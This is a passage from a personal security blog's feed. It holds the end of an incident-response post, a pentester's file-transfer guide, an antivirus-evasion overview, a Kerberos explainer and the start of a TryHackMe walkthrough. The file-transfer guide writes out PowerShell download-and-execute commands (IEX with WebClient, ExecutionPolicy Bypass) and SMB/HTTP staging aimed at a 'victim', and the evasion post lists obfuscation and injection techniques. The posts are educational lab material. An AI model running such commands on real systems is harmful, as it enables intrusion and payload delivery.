&lt;p&gt;May consist of CISO, privacy officer, General Counsel, Representative(s) from the Office of the President, and head of the organization where the cyber incident occurred.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;1-preparation&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*b6BEiI2FjVfUf6e-zduodQ.png&#34; alt=&#34;Image outlining steps in incident response&#34;  /&gt;

&lt;strong&gt;1. Preparation&lt;/strong&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Make sure there are people on the incident response team&lt;/li&gt;
&lt;li&gt;Make sure the team is trained and has access to the services that they would need in the case of an incident&lt;/li&gt;
&lt;li&gt;Have drills simulating an attack&lt;/li&gt;
&lt;li&gt;Create a plan/playbook for the Security Operations team containing steps and actions to take when compromised.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2-identification&#34;&gt;&lt;strong&gt;2. Identification&lt;/strong&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Find ways to detect deviations in the regular functioning of an application&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Software for this can include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IDS/IPS&lt;/li&gt;
&lt;li&gt;Security Incident Event Manager (SIEM)&lt;/li&gt;
&lt;li&gt;Endpoint detection &amp;amp; response (EDR)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Alerts will typically be addressed by a Security Operations Center (SOC) analyst who will assess whether there is a threat or a false alarm.&lt;/p&gt;
&lt;p&gt;Suspicious behavior might include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Unusual behavior from privileged attacks&lt;/li&gt;
&lt;li&gt;Unauthorized users trying to access servers and data&lt;/li&gt;
&lt;li&gt;Anomalies in outbound network traffic&lt;/li&gt;
&lt;li&gt;Traffic sent to or from unknown locations&lt;/li&gt;
&lt;li&gt;Excessive consumption of computing resources. Can be a sign of cryptojacking or running a heavy program&lt;/li&gt;
&lt;li&gt;Changes in configuration&lt;/li&gt;
&lt;li&gt;Hidden files&lt;/li&gt;
&lt;li&gt;Unexpected changes like users getting locked out of their accounts or memberships changing&lt;/li&gt;
&lt;li&gt;Suspicious registry entries&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Identify where the attacker initially got in.&lt;/p&gt;
&lt;p&gt;Identify what programs were uploaded, which files were changed, which new processes are running, and if any new registry keys were created.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3. Containment&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Prevent any further damage from occurring by containing it.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Short-term&lt;/strong&gt; containment is isolating the affected devices from the rest of the network.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Long-term&lt;/strong&gt; containment may involve taking an image of the device and performing hard-disk forensics. For this you would want a Digital forensics analyst. This can be necessary when a deeper analysis is required.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;4. Eradication&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Undoing the changes that the adversary made&lt;/li&gt;
&lt;li&gt;Installing patches&lt;/li&gt;
&lt;li&gt;Disarming malware&lt;/li&gt;
&lt;li&gt;Disabling compromised accounts&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;5. Recovery&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Return to normal service in the business.&lt;/li&gt;
&lt;li&gt;If clean backups are available, these can be used to restore service&lt;/li&gt;
&lt;li&gt;Compromised devices will need rebuilding to ensure recovery&lt;/li&gt;
&lt;li&gt;Affected devices may need additional monitoring&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;6. Lessons learned&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;This is the final stage of incident response.&lt;/li&gt;
&lt;li&gt;Have a post-incident review (PIR), or a meeting where representatives from each team discuss what went well and what could be improved. This is where the incident response plan can be refined.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h1 id=&#34;references&#34;&gt;References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://docs.microsoft.com/en-us/security/compass/incident-response-planning&#34;&gt;https://docs.microsoft.com/en-us/security/compass/incident-response-planning&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.varonis.com/blog/incident-response-plan&#34;&gt;https://www.varonis.com/blog/incident-response-plan&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://security.uconn.edu/incident-response-plan/&#34;&gt;https://security.uconn.edu/incident-response-plan/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Pentester’s Guide to Performing File Transfers</title>
      <link>http://localhost:1313/ally-petitt/posts/2022-06-08_pentester-s-guide-to-performing-file-transfers-3c1a6a38dfc8/</link>
      <pubDate>Wed, 08 Jun 2022 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2022-06-08_pentester-s-guide-to-performing-file-transfers-3c1a6a38dfc8/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*HNC0lT4gPMDU8uH0fyjRyw.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;foreword&#34;&gt;Foreword&lt;/h1&gt;
&lt;p&gt;To avoid detection, it is best to use tools that are native to the victim’s computer.&lt;/p&gt;
&lt;h1 id=&#34;ftp-with-windowshost&#34;&gt;FTP with Windows Host&lt;/h1&gt;
&lt;p&gt;While having a shell on the Windows machine, start an FTP server on your host machine. Follow these steps if you don’t already have FTP server installed:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt-get install vsftpd  
sudo service vsftpd start  
service vsftpd status #status should be active
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To check if your server is working, type &lt;code&gt;ftp localhost.&lt;/code&gt; If you see the message “Connected to localhost”, your FTP server is running.&lt;/p&gt;
&lt;h2 id=&#34;accessing-file-with-interactive-shell&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*ehYiaPXjraslOYhNqIv7Zw.png&#34; alt=&#34;&#34;  /&gt;

Accessing File With Interactive Shell&lt;/h2&gt;
&lt;p&gt;If you have an interactive shell on the Windows machine, run this command.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cscript wget.vbs http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;PATH TO FILE&amp;gt; &amp;lt;FILENAME TO SAVE AS&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;accessing-file-with-non-interactive-shell&#34;&gt;Accessing File With Non-Interactive Shell&lt;/h2&gt;
&lt;p&gt;If you don’t have an interactive shell, you can’t start PowerShell.exe. A workaround is to create a PowerShell script and execute it:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo $storageDir = $pwd &amp;gt; wget.ps1  
echo $webclient = New-Object System.Net.WebClient &amp;gt;&amp;gt;wget.ps1  
echo $url = &amp;#34;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;PATH TO FILE&amp;gt;&amp;#34; &amp;gt;&amp;gt;wget.ps1  
echo $file = &amp;#34;output-file.exe&amp;#34; &amp;gt;&amp;gt;wget.ps1  
echo $webclient.DownloadFile($url,$file) &amp;gt;&amp;gt;wget.ps1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To invoke&lt;code&gt;wget.ps1&lt;/code&gt;, call&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-ExecutionPolicy Bypass -noLogo -NonInteractive --- stealthly
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;powershell -c &amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;FILENAME&amp;gt;&amp;#39;)&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;IEX(New-Object Net.WebClient).downloadString(&amp;#39;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;FILENAME&amp;gt;&amp;#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;getting-files-through-powershell&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*nBHrLvu-D9RNlMsbTG3Wsg.jpeg&#34; alt=&#34;&#34;  /&gt;

Getting Files Through PowerShell&lt;/h1&gt;
&lt;p&gt;On your Kali Linux machine, make a copy of the file you want to send to &lt;code&gt;/var/www/html/&lt;/code&gt; . On the Window’s machine, execute the following:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;powershell -c &amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://192.168.10.128/unko.txt&amp;#39;,&amp;#39;C:\Users\Administrator\Desktop\transferme.txt&amp;#39;)&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;powershell -c &amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://192.168.119.146/gori.ps1&amp;#39;)&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;file-transfer-withsmb&#34;&gt;File Transfer With SMB&lt;/h1&gt;
&lt;h2 id=&#34;method-1&#34;&gt;Method 1&lt;/h2&gt;
&lt;p&gt;Get &lt;code&gt;smbserver.py&lt;/code&gt;from &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;Impacket&lt;/a&gt; and run the following on your Kali Linux machine:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;smbserver.py gori $(pwd) -smb2support -user gori -pass gorigori
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Run this on the victim’s machine:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;New-PSDrive -Name &amp;#34;gori&amp;#34; -PSProvider &amp;#34;FileSystem&amp;#34; -gori &amp;#34;\\&amp;lt;YOUR IP&amp;gt;\gori&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;method-2&#34;&gt;Method 2&lt;/h2&gt;
&lt;p&gt;Run this on your Kali machine:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;smbserver.py kali .
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Run this on the victim’s machine:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;On victim&amp;#39;s \\&amp;lt;YOUR IP ADDRESS&amp;gt;\kali\FILE\_NAME.exe &amp;#34;whoami&amp;#34; # &amp;#34;whoami&amp;#34; confirms that it is running
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;file-transfer-with-an-httpserver&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*i6K6JFM5TTxSFf4b_ermuQ.png&#34; alt=&#34;&#34;  /&gt;

File Transfer With an HTTP Server&lt;/h1&gt;
&lt;p&gt;On your machine run:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 -m http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This will start an HTTP server on port 80 with the root of the HTTP server being in the directory that you executed the command from. To get a file, run this on the victim’s machine:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget http://&amp;lt;YOUR IP&amp;gt;/path/to/file.txt
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;file-transfer-with-scp-andrsync&#34;&gt;File Transfer with SCP and RSYNC&lt;/h1&gt;
&lt;p&gt;Both of these methods of file transfer occur over SSH. Secure Copy Protocol (SCP) is being deprecated, however, if you’re able to use it, the syntax is fairly simple.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;scp &amp;lt;SOURCE&amp;gt; &amp;lt;DESTINATION&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this example, we are using SCP to copy a file from a remote host to the working directory of our local machine such that our computer is on the receiving end.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;scp username@ip_address:/home/username/filename
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you are looking to transfer a file from your computer to the remote host, the following syntax can be used:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;scp filename username@ip_address:/home/username
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The same commands can be used with RYSNC by simply replacing &lt;code&gt;scp&lt;/code&gt; with &lt;code&gt;rsync&lt;/code&gt; .&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rsync &amp;lt;SOURCE&amp;gt; &amp;lt;DESTINATION&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;There are countless ways to transfer files between two computers. Among the most common methods are HTTP and FTP, but if those don’t work, there is a chance that some of the other options here will. Some honorable mentions that I didn’t go into detail on are SSHFS, SFTP, Winscp, and Samba. I hope that you were able to find value in this article and remember to never stop learning.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Antivirus Evasion: What it is and How to do it</title>
      <link>http://localhost:1313/ally-petitt/posts/2022-05-30_antivirus-evasion--what-it-is-and-how-to-do-it-17f98e920704/</link>
      <pubDate>Mon, 30 May 2022 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2022-05-30_antivirus-evasion--what-it-is-and-how-to-do-it-17f98e920704/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*W1qjqIKKNMK9_QYWXGQzRw.png&#34; alt=&#34;picture of a bug&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;how-does-antivirus-software-actuallywork&#34;&gt;How Does Antivirus Software Actually Work?&lt;/h1&gt;
&lt;p&gt;Antivirus software acts as a defense from trojans, viruses, ransomware, spyware, adware, and much more. There are 3 main ways that it detects malware: signature-based detection, heuristic-based detection, and anomaly-based detection.&lt;/p&gt;
&lt;h2 id=&#34;signature-based-detection&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*ehROjARifrRnkEITjkFwMw.png&#34; alt=&#34;&#34;  /&gt;

Signature-Based Detection&lt;/h2&gt;
&lt;p&gt;The scanner will search for specific strings in a program and check for them in a database of known viruses. The strings are often the payload of the malicious code. If the signatures match, the activity is flagged for suspicious activity. Many of these databases store over 250,000 different signatures.&lt;/p&gt;
&lt;p&gt;Downsides to this approach:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The database only stores the values of known signatures&lt;/li&gt;
&lt;li&gt;Newer variations of malware may go undetected if their new signature is not stored in the database&lt;/li&gt;
&lt;li&gt;Viruses can be easily and quickly altered to change their signature&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;anomaly-based-detection&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*8jt-Qw_ai_h_GCSJV15fuQ.png&#34; alt=&#34;&#34;  /&gt;

Anomaly-Based Detection&lt;/h2&gt;
&lt;p&gt;Instead of referencing a static database that needs to be continuously updated, this type of detection checks the running program for patterns of . This can be referred to as an expert system. Often, these detection systems will utilize a &lt;strong&gt;machine learning model&lt;/strong&gt; that was trained using data from the past years of the company using the antivirus software.&lt;/p&gt;
&lt;h2 id=&#34;heuristic-based-detection&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*meCStYsucAG7XXY88Lnj0w.jpeg&#34; alt=&#34;&#34;  /&gt;

Heuristic-Based Detection&lt;/h2&gt;
&lt;p&gt;This is one of the few methods capable of detecting polymorphic viruses. Heuristic analysis may consist of multiple different methods, including static heuristic analysis. This technique deals with decompiling a program and comparing the source code to the source code of known viruses stored in a database.&lt;/p&gt;
&lt;p&gt;Additionally, heuristic analysis may include dynamic heuristics, a method of containing the program in a virtual machine to test what happens when the code is executed. The running program is monitored for suspicious activity such as overwriting files or self-replication.&lt;/p&gt;
&lt;h1 id=&#34;how-to-evade-antivirus-detection&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*VY6GEFR7NyUkIPcXNT49bg.jpeg&#34; alt=&#34;&#34;  /&gt;

How to Evade Antivirus Detection&lt;/h1&gt;
&lt;h2 id=&#34;on-disk-evasion&#34;&gt;&lt;strong&gt;On-Disk Evasion&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;The following are techniques used for on-disk evasion:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Obfuscation&lt;/strong&gt;- this method involves rewriting the code to appear more confusing and harder to read.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Cryptography&lt;/strong&gt;- the code will be encrypted with the decryption key stored in a stub. The program will be decrypted in memory.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Packing&lt;/strong&gt;- the code is condensed into a smaller binary file which results in a different signature on the payload.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Encoding&lt;/strong&gt;- the payload may be encoded as base64, hexadecimal, or other types of encodings.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;in-memory-evasion&#34;&gt;In-Memory Evasion&lt;/h2&gt;
&lt;p&gt;The following is a technique used for in-memory evasion:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Use Windows APIs to inject a payload into a running process&lt;/li&gt;
&lt;li&gt;Payload is executed in the memory of running process in a separate thread&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;command-line-tools&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*H6l629Qydy1pFxjjyoQn9A.jpeg&#34; alt=&#34;&#34;  /&gt;

Command-Line Tools&lt;/h2&gt;
&lt;p&gt;Here is a list of tools that can help craft undetectable payloads to bypass the antivirus software:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Veil-Evasion&lt;/li&gt;
&lt;li&gt;Shellter&lt;/li&gt;
&lt;li&gt;Invoke-Obfuscation&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;going-deeper&#34;&gt;Going Deeper&lt;/h1&gt;
&lt;p&gt;Here are some resources for those who are looking for a deeper understanding of antivirus evasion.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://youtu.be/iz1twCSJZyo&#34;&gt;Veil-Evasion Complete Tutorial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion&#34;&gt;Defense Evasion — Red Team Notes 2.0&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://youtu.be/V3_vc7BO9lU&#34;&gt;Malware Analysis Bootcamp - Extracting Strings&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://youtu.be/WmJcbDfy9L4&#34;&gt;ATT&amp;amp;CK Deep Dive: Defense Evasion&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.linode.com/docs/guides/windows-red-team-defense-evasion-techniques/&#34;&gt;Windows Red Team Defense Evasion Techniques&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Kerberos Authentication Explained</title>
      <link>http://localhost:1313/ally-petitt/posts/2022-05-25_kerberos-authentication-explained-3d45f336bb2c/</link>
      <pubDate>Wed, 25 May 2022 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2022-05-25_kerberos-authentication-explained-3d45f336bb2c/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*lPQ16gDtSYYccrc2-iExiA.jpeg&#34; alt=&#34;Kerberos- a three-headed dog&#34;  /&gt;

When first learning Kerberos, it can feel like you’re being chased by the three-headed dog. Not to fear, however, because today I’ll be explaining a high-level overview of Kerberos authentication. Kerberos was designed to provide secure authentication to services over a potentially insecure network. It is used by many organizations to implement single sign-on (SSO).&lt;/p&gt;
&lt;h1 id=&#34;kerberos-terminology&#34;&gt;Kerberos Terminology&lt;/h1&gt;
&lt;p&gt;In order to understand the step-by-step explanation, it is important to have a basic understanding of the various components of Kerberos.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Kerberos Realm-&lt;/strong&gt; the domain in which Kerberos has the ability to authenticate a user&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Principal-&lt;/strong&gt; A unique identity within a Realm that represents either a user or service&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Client-&lt;/strong&gt; The user that is trying to access a service&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Service-&lt;/strong&gt; A resource provided to a client (eg. a file server, application, etc.)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Key Distribution Center (KDC)-&lt;/strong&gt; Supplies tickets and generates temporary session keys that allow a user to securely authenticate to a service. It also stores the secret symmetric keys for all of the users and services&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Authentication Server-&lt;/strong&gt; ensures that the client making the request to the service is a known user. It then issues a ticket-granting ticket&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Ticket Granting Server-&lt;/strong&gt; ensures that the user is making a request to a known service and grants service tickets&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;how-kerberosworks&#34;&gt;How Kerberos Works&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*X7pcMLxklUmSlsC8ZvDO1A.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The user sends an unencrypted message to the Authentication server requesting to access a service&lt;/li&gt;
&lt;li&gt;The Authentication server validates that the request came from a known user and generates a ticket-granting ticket (a ticket that allows you to be granted a ticket by the Ticket Granting Server)&lt;/li&gt;
&lt;li&gt;The Ticket Granting Ticket (TGT) is sent to the user alongside a message encrypted with the user’s secret key&lt;/li&gt;
&lt;li&gt;The user uses their secret key to decrypt the message and generates new messages.&lt;/li&gt;
&lt;li&gt;The user sends their new messages and the TGT that they received (step 3) to the Ticket Granting Server&lt;/li&gt;
&lt;li&gt;The Ticket Granting Server decrypts the Ticket Granting Ticket and does validation. Then, it creates a service ticket and a new encrypted message back to the user&lt;/li&gt;
&lt;li&gt;The user decrypts the message and creates an Authenticator message. The user Authenticator and the service ticket is finally sent to the service.&lt;/li&gt;
&lt;li&gt;The service decrypts and validates the service ticket and Authenticator message. Then, it sends back its own Authenticator message to the user.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;To paraphrase this, Kerberos makes sure that the user is legit, then it makes sure that the service is legit. Finally, a secure connection is created between the user and the service.&lt;/p&gt;
&lt;h1 id=&#34;key-benefits-of-usingkerberos&#34;&gt;Key Benefits of Using Kerberos&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Passwords are never sent across the network&lt;/li&gt;
&lt;li&gt;Encryption keys are never directly exchanged&lt;/li&gt;
&lt;li&gt;Mutual authentication between the client and the application&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;I hope that this overview cleared up some of the confusion around Kerberos authentication. Thank you for reading.&lt;/p&gt;
&lt;h1 id=&#34;more-resources&#34;&gt;More Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://youtu.be/5N242XcKAsM&#34;&gt;Kerberos Authentication Explained | A deep dive&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Kerberos_%28protocol%29&#34;&gt;Kerberos (protocol)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.freecodecamp.org/news/how-does-kerberos-work-authentication-protocol/&#34;&gt;How Does Kerberos Work? The Authentication Protocol Explained&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Mustacchio Walkthrough | Try Hack Me | Ally Petitt</title>
      <link>http://localhost:1313/ally-petitt/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/</link>
      <pubDate>Fri, 18 Feb 2022 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*F19asfqgh7o-jFDVwsTizA.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!&lt;/p&gt;
&lt;p&gt;Notes: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;enumeration&#34;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;To begin, I scanned for open ports using &lt;a href=&#34;https://github.com/RustScan/RustScan&#34;&gt;RustScan&lt;/a&gt;. RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer. My results were as follows:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;PORT STATE SERVICE REASON VERSION   22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)   80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))   | http-robots.txt: 1 disallowed entry    |_/   | http-methods:    |_ Supported Methods: GET HEAD POST OPTIONS   |_http-server-header: Apache/2.4.18 (Ubuntu)   |_http-title: Mustacchio | Home   8765/tcp open http syn-ack nginx 1.10.3 (Ubuntu)   |_http-server-header: nginx/1.10.3 (Ubuntu)   |_http-title: Mustacchio | Login   | http-methods:    |_ Supported Methods: GET HEAD POST   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;As shown by this scan, there are 3 ports open. I investigated the website on port 80 first. I looked through the source code, checked for cookies, looked for linked javascript files, and tested the contact form for cross-site scripting. I found nothing interesting, so I continued to do directory enumeration using &lt;a href=&#34;https://github.com/ffuf/ffuf&#34;&gt;FFUF&lt;/a&gt; (you can also use Wfuzz, Gobuster, or DirBuster for this part).&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ffuf -u &amp;lt;http://10.10.93.193/FUZZ&amp;gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*erwnChNmTvF8tXrU6r_S-Q.png&#34; alt=&#34;&#34;  /&gt;

The custom directory looks interesting. I noticed it earlier when I was looking at the linked JavaScript files. Let’s investigate.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*V_As8mpAktOxs0GjknBnAw.png&#34; alt=&#34;&#34;  /&gt;

And we have access to these files! I went inside the JavaScript file and found a file called users.bak. I downloaded the file and ran the strings command on it.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ strings users.bak    SQLite format 3   tableusersusers   CREATE TABLE users(username text NOT NULL, password text NOT NULL)   ]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;From this file, we have learned that they are using SQLite 3 to store their users. Now, we have a way to view the admin user in their database. Great! Before we go deeper into this, I’d like to explore the other web server running on port 8765.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*tmf5emcwConOrADGYV4Veg.png&#34; alt=&#34;&#34;  /&gt;

How great is this! We found the admin panel where we can log in as admin. Let’s see if we can get the admin credentials using the users.bak file.&lt;/p&gt;
&lt;h1 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h1&gt;
&lt;p&gt;After a few Google searches, I found out how to open this file. I used the SQLite3 CLI:&lt;/p&gt;
